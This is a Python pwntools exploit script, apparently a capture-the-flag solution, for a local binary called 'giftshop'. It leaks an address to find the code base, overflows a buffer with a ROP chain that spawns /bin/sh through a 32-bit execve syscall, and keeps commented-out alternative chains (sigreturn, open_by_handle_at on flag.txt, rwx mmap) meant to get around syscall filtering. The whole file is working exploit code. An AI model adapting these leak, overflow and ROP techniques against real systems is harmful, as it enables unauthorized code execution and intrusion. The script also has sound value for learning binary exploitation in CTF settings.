#!/usr/bin/python
from pwn import *

def order(data):
	r.sendlineafter('Your choice:\n', '1')
	r.sendlineafter("receiver's name ? y/n\n", 'n')
	r.sendlineafter('\n\n', '1')
	r.sendlineafter('DONE !!\n', '6')
	r.sendlineafter('Do you want to ship it ? y/n\n', data)

r = process('./giftshop')
#r = remote('localhost',12346)
context.log_level = 'debug'


r.recvuntil('you come here !\n')
leak = int(r.recvline()[:-1],16)
success('leaked_addr = '+hex(leak))
CODE_BASE = leak-0x2030d8 
log.info('CODE_BASE = '+hex(CODE_BASE))

#gdb.attach(r, 'b* 0x{:x}'.format(CODE_BASE+0x0000019BC))

r.sendlineafter('Can you give me your name plzz ??\n', 'Q'+'\x00'+'/bin/sh') # 0x2031e0
r.sendlineafter("Enter the receiver's name plzz: \n", 'Q'+'\x00'+'/proc/self/mem') # 0x203120

'''
0x000000000000225f : pop rdi ; ret
0x0000000000002261 : pop rsi ; ret
0x0000000000002265 : pop rdx ; ret
0x0000000000002267 : pop rax ; ret
0x0000000000002251 : inc rax ; syscall ; retg
0x0000000000002254 : syscall ; ret
'''


payload = 'y'+'\x00'*(0x60-1)
payload += 'A'*8		# rbp

#### call sys_execve 32bit #### => OK!
payload += p64(CODE_BASE + 0x225f) # pop rdi; ret;
payload += p64(CODE_BASE + 0x2031e0 + 2) # 0
payload += p64(CODE_BASE + 0x2261) # pop rsi; ret;
payload += p64(0) # 
payload += p64(CODE_BASE + 0x2265) # pop rdx; ret;
payload += p64(0) # 0
payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
payload += p64(0x40000000 + 59) # sys_execve 32bit
payload += p64(CODE_BASE + 0x2254) # syscall



#### stub_execvat (set argv with sigreturn) ### => OK!
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(0xf)
# payload += p64(CODE_BASE + 0x2254) # syscall
#
# frame = SigreturnFrame(arch='amd64')
# frame.rax = 322
# frame.rdi = 0
# frame.rsi = CODE_BASE + 0x2031e0 + 2
# frame.rdx = 0
# frame.r10 = 0
# frame.r8 = 0
# frame.rip = CODE_BASE + 0x2254
#
# payload += str(frame)



#### open_by_handel_at, but this use open(), not bypass #### => maybe...?
# payload += p64(CODE_BASE + 0x225f) # pop rdi; ret;
# payload += p64(0) # 0
# payload += p64(CODE_BASE + 0x2261) # pop rsi; ret;
# payload += p64(CODE_BASE + 0x203120 + 2) # flag.txt 
# payload += p64(CODE_BASE + 0x2265) # pop rdx; ret;
# payload += p64(CODE_BASE + 0x203120 + 0x30) # 0
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(322)	# open_by_handle_at
# payload += p64(CODE_BASE + 0x2254) # syscall
# payload += p64(CODE_BASE + 0xc00)



#### get_ppid() -> open('/proc/$ppid/mem'), but no rax control #### => nooop!
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(110)	# 
# payload += p64(CODE_BASE + 0x2254) # syscall
# ??
# payload += p64(CODE_BASE + 0x225f) # pop rdi; ret;
# payload += p64(CODE_BASE + 0x203120 + 2) # receiver's name
# payload += p64(CODE_BASE + 0x2261) # pop rsi; ret;
# payload += p64(0x700) # rwx
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(2)	# 
# payload += p64(CODE_BASE + 0x2254) # syscall



#### mmap(0x40000, 0x1000, rwx) -> jmp that #### => noop!
# payload += p64(CODE_BASE + 0x225f) # pop rdi; ret;
# payload += p64(0x40000) # 0
# payload += p64(CODE_BASE + 0x2261) # pop rsi; ret;
# payload += p64(0x1000) 
# payload += p64(CODE_BASE + 0x2265) # pop rdx; ret;
# payload += p64(0x7) # 0
# payload += p64(CODE_BASE + 0x2267) # pop rax; ret;
# payload += p64(0x8) # sys_execve
# payload += p64(CODE_BASE + 0x2251) # inc rax; syscall 9
# payload += 'AAAAAAAA'


order(payload)

r.sendlineafter('Enter your address: \n', '1')
r.sendlineafter('A letter for her/him:\n', '1')

r.interactive()
